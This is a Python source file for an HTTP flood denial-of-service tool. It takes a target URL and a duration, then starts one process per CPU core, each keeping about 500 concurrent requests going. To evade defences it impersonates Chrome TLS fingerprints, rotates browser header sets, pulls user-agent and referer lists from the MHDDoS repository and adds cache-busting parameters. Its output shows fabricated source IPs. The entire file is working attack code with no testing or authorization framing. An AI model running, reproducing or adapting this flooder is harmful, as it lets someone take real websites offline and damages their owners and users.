import asyncio
import sys
import time
import random
import os
import threading
import multiprocessing
import signal
import urllib.request
from multiprocessing import Manager, Queue
from queue import Empty
from typing import Optional, List, Dict, Any
from urllib.parse import urlparse

try:
    from curl_cffi.requests import AsyncSession
    HAS_CURL_CFFI = True
except ImportError:
    HAS_CURL_CFFI = False
    import aiohttp

try:
    import uvloop
    uvloop.install()
    HAS_UVLOOP = True
except ImportError:
    HAS_UVLOOP = False


UA_URL = "https://raw.githubusercontent.com/MatrixTM/MHDDoS/main/files/useragent.txt"
REF_URL = "https://raw.githubusercontent.com/MatrixTM/MHDDoS/main/files/referers.txt"

GREEN = "\033[92m"
RED = "\033[91m"
RESET = "\033[0m"


RUNNING = True
USER_AGENTS: List[str] = []
REFERERS: List[str] = []
LOGQ = None


def gen_fake_ip() -> str:
    return f"{random.randint(1, 254)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"


def resolve_ip(target: str) -> str:
    try:
        import socket
        p = urlparse(target)
        host = p.hostname
        if not host:
            return gen_fake_ip()
        try:
            return socket.gethostbyname(host)
        except Exception:
            pass
        try:
            import subprocess
            out = subprocess.check_output(["ping", "-c", "1", "-W", "1", host], stderr=subprocess.DEVNULL)
            for line in out.decode().splitlines():
                if "(" in line and ")" in line:
                    return line.split("(")[1].split(")")[0]
        except Exception:
            pass
        return gen_fake_ip()
    except Exception:
        return gen_fake_ip()


def fetch_list(url: str, fallback: List[str]) -> List[str]:
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=15) as r:
            data = r.read().decode("utf-8", errors="ignore")
        items = [line.strip() for line in data.splitlines() if line.strip()]
        if items:
            return items
    except Exception:
        pass
    return fallback


CHROME_BASE = {
    "sec-ch-ua": '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "upgrade-insecure-requests": "1",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "sec-fetch-site": "none",
    "sec-fetch-mode": "navigate",
    "sec-fetch-user": "?1",
    "sec-fetch-dest": "document",
    "accept-encoding": "gzip, deflate, br, zstd",
    "accept-language": "en-US,en;q=0.9",
    "priority": "u=0, i",
}

CHROME_MAC = dict(CHROME_BASE)
CHROME_MAC["sec-ch-ua-platform"] = '"macOS"'
CHROME_MAC["user-agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
CHROME_MAC["sec-fetch-site"] = "cross-site"

CHROME_LINUX = dict(CHROME_BASE)
CHROME_LINUX["sec-ch-ua-platform"] = '"Linux"'
CHROME_LINUX["user-agent"] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
CHROME_LINUX["sec-fetch-site"] = "same-origin"

CHROME_ANDROID = dict(CHROME_BASE)
CHROME_ANDROID["sec-ch-ua-mobile"] = "?1"
CHROME_ANDROID["sec-ch-ua-platform"] = '"Android"'
CHROME_ANDROID["user-agent"] = "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36"

FIREFOX_BASE = {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0",
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "accept-language": "en-US,en;q=0.5",
    "accept-encoding": "gzip, deflate, br, zstd",
    "upgrade-insecure-requests": "1",
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "none",
    "sec-fetch-user": "?1",
    "priority": "u=0, i",
}

FIREFOX_LINUX = dict(FIREFOX_BASE)
FIREFOX_LINUX["user-agent"] = "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"

SAFARI_BASE = {
    "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "accept-language": "en-US,en;q=0.9",
    "accept-encoding": "gzip, deflate, br",
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "none",
    "upgrade-insecure-requests": "1",
}

SAFARI_IOS = {
    "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Mobile/15E148 Safari/604.1",
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "accept-language": "en-US,en;q=0.9",
    "accept-encoding": "gzip, deflate, br",
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "none",
    "upgrade-insecure-requests": "1",
}

CHROME_EDGE = dict(CHROME_BASE)
CHROME_EDGE["user-agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
CHROME_EDGE["sec-ch-ua"] = '"Chromium";v="136", "Microsoft Edge";v="136", "Not.A/Brand";v="99"'

CHROME_OPERA = dict(CHROME_BASE)
CHROME_OPERA["user-agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 OPR/119.0.0.0"
CHROME_OPERA["sec-ch-ua"] = '"Chromium";v="136", "Opera";v="119", "Not.A/Brand";v="99"'

STATIC_HEADER_SETS: List[Dict[str, str]] = [
    CHROME_BASE,
    CHROME_MAC,
    CHROME_LINUX,
    CHROME_ANDROID,
    FIREFOX_BASE,
    FIREFOX_LINUX,
    SAFARI_BASE,
    SAFARI_IOS,
    CHROME_EDGE,
    CHROME_OPERA,
]


def build_header_set() -> Dict[str, str]:
    base = dict(random.choice(STATIC_HEADER_SETS))
    if USER_AGENTS:
        base["user-agent"] = random.choice(USER_AGENTS)
    if REFERERS:
        base["referer"] = random.choice(REFERERS)
    return base


def build_url(target: str) -> str:
    ts = int(time.time() * 1000)
    rnd = random.randint(1000000, 9999999)
    sep = "&" if "?" in target else "?"
    return f"{target}{sep}_={ts}&r={rnd}"


def parse_target(raw: str) -> str:
    raw = raw.strip()
    if not raw:
        raise ValueError("empty")
    if not raw.startswith(("http://", "https://")):
        raw = "https://" + raw
    p = urlparse(raw)
    if not p.hostname:
        raise ValueError("bad url")
    return raw


class Worker:
    def __init__(self, target: str, duration: float, concurrency: int, q):
        self.target = target
        self.duration = duration
        self.concurrency = concurrency
        self.end_time = time.time() + duration
        self.session = None
        self.q = q

    async def init(self):
        if HAS_CURL_CFFI:
            self.session = AsyncSession(
                impersonate="chrome136",
                timeout=8,
                allow_redirects=False,
                verify=False,
            )
        else:
            import aiohttp
            connector = aiohttp.TCPConnector(
                limit=self.concurrency * 4,
                limit_per_host=self.concurrency * 4,
                ssl=False,
                ttl_dns_cache=600,
            )
            self.session = aiohttp.ClientSession(
                connector=connector,
                timeout=aiohttp.ClientTimeout(total=8),
            )

    async def fire(self, sem: asyncio.Semaphore):
        async with sem:
            if not RUNNING or time.time() >= self.end_time:
                return
            url = build_url(self.target)
            headers = build_header_set()
            fake_ip = gen_fake_ip()
            try:
                if HAS_CURL_CFFI:
                    r = await self.session.get(url, headers=headers)
                    sc = r.status_code
                    try:
                        self.q.put_nowait((fake_ip, sc))
                    except Exception:
                        pass
                else:
                    async with self.session.get(url, headers=headers, ssl=False) as r:
                        await r.read()
                        sc = r.status
                        try:
                            self.q.put_nowait((fake_ip, sc))
                        except Exception:
                            pass
            except asyncio.CancelledError:
                raise
            except Exception:
                pass

    async def run(self):
        await self.init()
        sem = asyncio.Semaphore(self.concurrency)
        tasks = set()
        try:
            while RUNNING and time.time() < self.end_time:
                while len(tasks) < self.concurrency * 5 and RUNNING and time.time() < self.end_time:
                    t = asyncio.create_task(self.fire(sem))
                    tasks.add(t)
                if tasks:
                    done, pending = await asyncio.wait(
                        tasks, timeout=0.02, return_when=asyncio.FIRST_COMPLETED
                    )
                    for t in done:
                        tasks.discard(t)
                await asyncio.sleep(0)
            if tasks:
                await asyncio.gather(*tasks, return_exceptions=True)
        finally:
            if self.session:
                try:
                    await self.session.close()
                except Exception:
                    pass


def worker_proc(target: str, duration: float, conc: int, q):
    global RUNNING
    RUNNING = True
    loop = None
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        w = Worker(target, duration, conc, q)
        loop.run_until_complete(w.run())
    except Exception:
        pass
    finally:
        if loop:
            try:
                loop.close()
            except Exception:
                pass


def monitor(target: str, q):
    buf = []
    last_flush = time.time()
    while RUNNING:
        try:
            item = q.get(timeout=0.05)
            buf.append(item)
        except Empty:
            pass
        except Exception:
            pass
        now = time.time()
        if buf and (len(buf) >= 1 or now - last_flush > 0.05):
            for ip, sc in buf:
                color = GREEN if sc == 200 else RED
                sys.stdout.write(f"(zupher@localhost) --> {target} From IP: {ip} {color}{sc}{RESET}\n")
            sys.stdout.flush()
            buf.clear()
            last_flush = now
        if now - last_flush > 0.5:
            last_flush = now
    while True:
        try:
            item = q.get_nowait()
            buf.append(item)
        except Exception:
            break
    for ip, sc in buf:
        color = GREEN if sc == 200 else RED
        sys.stdout.write(f"(zupher@localhost) --> {target} From IP: {ip} {color}{sc}{RESET}\n")
    sys.stdout.flush()


def banner():
    os.system("cls" if os.name == "nt" else "clear")
    print()       
    print()


def ask():
    banner()
    while True:
        u = input("URL  : ").strip()
        if not u:
            continue
        try:
            t = parse_target(u)
            break
        except Exception as ex:
            print(f"[-] {ex}")
    while True:
        try:
            d = float(input("TIME : ").strip())
            if d > 0:
                break
        except Exception:
            print("[-]")
    return t, d


def kill_all(workers):
    for p in workers:
        if p.is_alive():
            try:
                p.kill()
            except Exception:
                try:
                    p.terminate()
                except Exception:
                    pass


def sig_handler(s, f):
    global RUNNING
    RUNNING = False


def main():
    global RUNNING, USER_AGENTS, REFERERS, LOGQ
    try:
        target, dur = ask()
    except (KeyboardInterrupt, EOFError):
        print("\n[-] aborted")
        sys.exit(0)

    USER_AGENTS = fetch_list(UA_URL, [])
    REFERERS = fetch_list(REF_URL, [])

    mgr = Manager()
    LOGQ = mgr.Queue(maxsize=200000)

    cpu = os.cpu_count() or 4
    procs = max(2, cpu)
    conc = 500

    signal.signal(signal.SIGINT, sig_handler)
    signal.signal(signal.SIGTERM, sig_handler)

    mon = threading.Thread(target=monitor, args=(target, LOGQ), daemon=True)
    mon.start()

    workers: List[multiprocessing.Process] = []
    for _ in range(procs):
        p = multiprocessing.Process(
            target=worker_proc, args=(target, dur, conc, LOGQ), daemon=True
        )
        p.start()
        workers.append(p)

    try:
        end_time = time.time() + dur
        while RUNNING and time.time() < end_time:
            time.sleep(0.1)
    except KeyboardInterrupt:
        RUNNING = False
    finally:
        RUNNING = False
        kill_all(workers)
        for p in workers:
            try:
                p.join(timeout=1)
            except Exception:
                pass

    try:
        mon.join(timeout=1.5)
    except Exception:
        pass


if __name__ == "__main__":
    main()
